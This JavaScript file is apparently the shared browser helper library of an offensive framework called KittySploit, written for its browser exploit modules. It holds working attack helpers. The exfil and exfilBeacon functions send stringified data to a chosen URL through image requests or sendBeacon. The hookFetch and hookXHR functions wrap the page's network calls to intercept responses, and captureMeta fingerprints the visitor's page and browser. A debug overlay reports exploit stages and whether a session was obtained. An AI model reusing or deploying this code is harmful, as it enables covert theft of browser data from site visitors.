// KittySploit Browser Generic Library v1
// Shared helpers for browser_exploits modules.
(function (global) {
  'use strict';

  if (!global.KS) {
    global.KS = {};
  }

  if (!global.KS.util) {
    global.KS.util = {};
  }

  global.KS.util.version = '1.1.0';

  global.KS.util.now = function () {
    return Date.now ? Date.now() : new Date().getTime();
  };

  global.KS.util.randomId = function (prefix) {
    var p = prefix || 'ks';
    return p + '_' + Math.random().toString(36).slice(2) + '_' + global.KS.util.now();
  };

  global.KS.util.onReady = function (callback) {
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
      callback();
      return;
    }
    document.addEventListener('DOMContentLoaded', callback, { once: true });
  };

  global.KS.util.safeStringify = function (value) {
    try {
      return JSON.stringify(value);
    } catch (e) {
      return '"[unserializable]"';
    }
  };

  global.KS.util.exfil = function (url, data) {
    try {
      var payload = typeof data === 'string' ? data : global.KS.util.safeStringify(data);
      var sep = url.indexOf('?') === -1 ? '?' : '&';
      var img = new Image();
      img.src = url + sep + 'd=' + encodeURIComponent(payload);
      return true;
    } catch (e) {
      return false;
    }
  };

  global.KS.util.exfilBeacon = function (url, data) {
    try {
      if (navigator && typeof navigator.sendBeacon === 'function') {
        var payload = typeof data === 'string' ? data : global.KS.util.safeStringify(data);
        return navigator.sendBeacon(url, payload);
      }
      return false;
    } catch (e) {
      return false;
    }
  };

  global.KS.util.http = function (url, options) {
    if (typeof fetch === 'function') {
      return fetch(url, options || {})
        .then(function (res) { return res.text(); })
        .catch(function () { return null; });
    }
    return Promise.resolve(null);
  };

  global.KS.util.httpJson = function (url, options) {
    if (typeof fetch === 'function') {
      return fetch(url, options || {})
        .then(function (res) { return res.json(); })
        .catch(function () { return null; });
    }
    return Promise.resolve(null);
  };

  global.KS.util.captureMeta = function () {
    var data = {};
    try {
      data.url = String(location.href || '');
      data.title = String(document.title || '');
      data.referrer = String(document.referrer || '');
      data.userAgent = String(navigator.userAgent || '');
      data.language = String(navigator.language || '');
      data.screen = {
        w: window.screen ? window.screen.width : 0,
        h: window.screen ? window.screen.height : 0
      };
      data.viewport = {
        w: window.innerWidth || 0,
        h: window.innerHeight || 0
      };
    } catch (e) {
      return data;
    }
    return data;
  };

  global.KS.util.hookFetch = function (onResponse) {
    if (typeof fetch !== 'function') {
      return false;
    }
    if (global.KS.util._fetchHooked) {
      return true;
    }
    var originalFetch = fetch;
    global.KS.util._fetchHooked = true;
    global.fetch = function () {
      return originalFetch.apply(this, arguments).then(function (res) {
        try {
          if (typeof onResponse === 'function') {
            onResponse(res);
          }
        } catch (e) {
          // ignore
        }
        return res;
      });
    };
    return true;
  };

  global.KS.util.hookXHR = function (onResponse) {
    if (!global.XMLHttpRequest || global.KS.util._xhrHooked) {
      return false;
    }
    global.KS.util._xhrHooked = true;
    var OriginalXHR = XMLHttpRequest;
    global.XMLHttpRequest = function () {
      var xhr = new OriginalXHR();
      xhr.addEventListener('load', function () {
        try {
          if (typeof onResponse === 'function') {
            onResponse(xhr);
          }
        } catch (e) {
          // ignore
        }
      });
      return xhr;
    };
    global.XMLHttpRequest.prototype = OriginalXHR.prototype;
    return true;
  };

  global.KS.util.log = function () {
    if (global.KS.util.silent) {
      return;
    }
    if (typeof console !== 'undefined' && console.log) {
      console.log.apply(console, arguments);
    }
  };

  // Visual exploit debugger — floating terminal overlay for browser_exploits modules.
  global.KS.debug = {
    _panel: null,
    _body: null,
    _enabled: false,
    _title: 'KittySploit Exploit Debug',

    init: function (options) {
      options = options || {};
      if (options.enabled === false) {
        this._enabled = false;
        return false;
      }
      this._enabled = true;
      this._title = options.title || 'KittySploit Exploit Debug';
      var subtitle = options.subtitle || '';

      if (this._panel && document.body.contains(this._panel)) {
        if (subtitle) {
          var sub = this._panel.querySelector('[data-ks-debug-subtitle]');
          if (sub) {
            sub.textContent = subtitle;
          }
        }
        return true;
      }

      var root = document.createElement('div');
      root.id = 'ksExploitDebugShell';
      root.setAttribute('data-ks-debug', '1');
      root.style.cssText = [
        'position:fixed',
        'left:12px',
        'right:12px',
        'bottom:12px',
        'height:min(42vh, 420px)',
        'z-index:2147483646',
        'display:flex',
        'flex-direction:column',
        'border-radius:10px',
        'overflow:hidden',
        'box-shadow:0 12px 40px rgba(0,0,0,0.45)',
        'border:1px solid rgba(255,255,255,0.08)',
        'background:#0d1117',
        'color:#c9d1d9',
        'font:12px/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace'
      ].join(';');

      var header = document.createElement('div');
      header.style.cssText = [
        'display:flex',
        'align-items:center',
        'gap:8px',
        'padding:8px 12px',
        'background:linear-gradient(180deg,#161b22 0%,#0d1117 100%)',
        'border-bottom:1px solid rgba(255,255,255,0.08)',
        'user-select:none'
      ].join(';');

      var titleWrap = document.createElement('div');
      titleWrap.style.cssText = 'flex:1;min-width:0;';
      var titleEl = document.createElement('div');
      titleEl.textContent = this._title;
      titleEl.style.cssText = 'font-weight:600;color:#58a6ff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;';
      var subEl = document.createElement('div');
      subEl.setAttribute('data-ks-debug-subtitle', '1');
      subEl.textContent = subtitle;
      subEl.style.cssText = 'font-size:11px;color:#8b949e;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;';
      titleWrap.appendChild(titleEl);
      titleWrap.appendChild(subEl);

      var btnStyle = 'cursor:pointer;border:1px solid rgba(255,255,255,0.12);background:#21262d;color:#c9d1d9;border-radius:6px;padding:4px 8px;font:inherit;';
      var clearBtn = document.createElement('button');
      clearBtn.type = 'button';
      clearBtn.textContent = 'Clear';
      clearBtn.style.cssText = btnStyle;
      var minBtn = document.createElement('button');
      minBtn.type = 'button';
      minBtn.textContent = 'Min';
      minBtn.style.cssText = btnStyle;

      header.appendChild(titleWrap);
      header.appendChild(clearBtn);
      header.appendChild(minBtn);

      var body = document.createElement('pre');
      body.style.cssText = [
        'flex:1',
        'margin:0',
        'padding:10px 12px',
        'overflow:auto',
        'white-space:pre-wrap',
        'word-break:break-word',
        'background:#010409'
      ].join(';');

      root.appendChild(header);
      root.appendChild(body);

      var self = this;
      clearBtn.addEventListener('click', function () {
        if (self._body) {
          self._body.textContent = '';
        }
      });
      minBtn.addEventListener('click', function () {
        var collapsed = body.style.display === 'none';
        body.style.display = collapsed ? 'block' : 'none';
        root.style.height = collapsed ? 'min(42vh, 420px)' : 'auto';
        minBtn.textContent = collapsed ? 'Min' : 'Expand';
      });

      this._panel = root;
      this._body = body;

      var mount = function () {
        if (!document.body) {
          return;
        }
        document.body.appendChild(root);
        // Yield to the browser so the overlay paints before long sync exploit work.
        var paint = function () {
          void root.getBoundingClientRect();
          self.log('Visual debugger ready', 'info');
        };
        if (typeof requestAnimationFrame === 'function') {
          requestAnimationFrame(function () {
            requestAnimationFrame(paint);
          });
        } else {
          paint();
        }
      };
      if (document.body) {
        mount();
      } else {
        global.KS.util.onReady(mount);
      }
      return true;
    },

    _color: function (type) {
      switch (type) {
        case 'success': return '#3fb950';
        case 'warn': return '#d29922';
        case 'error': return '#f85149';
        case 'stage': return '#a371f7';
        default: return '#79c0ff';
      }
    },

    log: function (message, type) {
      type = type || 'info';
      var text = String(message);
      var line = '[' + new Date().toLocaleTimeString() + '] ' + text;
      if (typeof console !== 'undefined' && console.log) {
        console.log(line);
      }
      if (!this._enabled || !this._body) {
        return;
      }
      var span = document.createElement('span');
      span.style.color = this._color(type);
      span.textContent = line + '\n';
      this._body.appendChild(span);
      this._body.scrollTop = this._body.scrollHeight;
    },

    finish: function (ok, stage, message, extra) {
      var payload = {
        ok: !!ok,
        stage: stage || 'unknown',
        message: message || '',
        sessionExpected: !!ok
      };
      if (extra && typeof extra === 'object') {
        for (var key in extra) {
          if (Object.prototype.hasOwnProperty.call(extra, key)) {
            payload[key] = extra[key];
          }
        }
      }
      this.log((ok ? '[+] ' : '[-] ') + (stage || 'done') + ': ' + (message || ''), ok ? 'success' : 'error');
      return global.KS.util.safeStringify(payload);
    }
  };
})(window);
